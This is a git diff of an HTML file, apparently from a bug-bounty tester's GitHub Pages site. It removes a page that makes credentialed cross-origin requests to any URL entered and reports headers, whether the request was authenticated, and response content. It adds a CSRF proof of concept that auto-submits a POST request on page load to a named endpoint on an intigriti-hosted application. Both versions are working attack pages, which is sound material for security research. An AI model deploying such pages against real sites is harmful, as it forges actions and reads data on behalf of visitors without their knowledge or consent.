@@ -1,51 +1,11 @@
-<!DOCTYPE html>
+<!-- csrf-poc.html -->
 <html>
-<head>
-  <title>CORS Misconfig Test from username21-rd.github.io</title>
-</head>
-<body>
-  <h2>CORS Misconfiguration Test</h2>
-
-  <label for="targetUrl">Target URL:</label><br>
-  <input type="text" id="targetUrl" size="80" placeholder="https://example.com/resource"><br><br>
-  <button onclick="testCORS()">Test CORS</button>
-
-  <pre id="result" style="white-space: pre-wrap; margin-top: 20px; background: #f0f0f0; padding: 10px;"></pre>
-
-  <script>
-    async function testCORS() {
-      const url = document.getElementById("targetUrl").value.trim();
-      const output = document.getElementById("result");
-      output.textContent = "Testing...\n";
-
-      try {
-        const response = await fetch(url, {
-          method: "GET",
-          credentials: "include"  // this will send cookies if browser allows
-        });
-
-        const headers = {};
-        response.headers.forEach((value, key) => headers[key.toLowerCase()] = value);
-
-        const html = await response.text();
-
-        const result = {
-          "Target URL": url,
-          "Origin (your page)": location.origin,
-          "Response Status": response.status,
-          "Access-Control-Allow-Origin": headers["access-control-allow-origin"] || "❌ Not present",
-          "Access-Control-Allow-Credentials": headers["access-control-allow-credentials"] || "❌ Not present",
-          "Was authenticated?": /logout|user|dashboard|ng-app/i.test(html) && !/login/i.test(html)
-            ? "✅ Possibly"
-            : "❓ Probably not (unauthenticated)",
-          "Response Snippet": html.slice(0, 600) + (html.length > 600 ? "..." : "")
-        };
-
-        output.textContent = JSON.stringify(result, null, 2);
-      } catch (e) {
-        output.textContent = "❌ Request failed:\n" + e;
-      }
-    }
-  </script>
-</body>
+  <body>
+    <h1>CSRF Test – Do Not Close</h1>
+    <form id="csrfForm" method="POST" action="https://intigriti.ilias-solutions.com/intigriti/moplan/rest/moplan/monthlyPlanAsset/ratio">
+    </form>
+    <script>
+      document.getElementById("csrfForm").submit();
+    </script>
+  </body>
 </html>
